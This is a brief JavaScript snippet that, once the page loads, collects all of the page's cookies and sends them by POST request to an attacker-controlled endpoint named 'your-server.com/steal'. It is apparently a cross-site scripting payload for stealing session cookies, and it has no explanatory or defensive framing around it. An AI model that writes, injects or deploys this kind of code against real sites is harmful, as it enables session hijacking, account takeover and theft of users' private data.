document.addEventListener('DOMContentLoaded', function() {
    // Get all cookies
    var cookies = document.cookie;

    // Send cookies to the server
    fetch('http://your-server.com/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookies: cookies })
    });
});
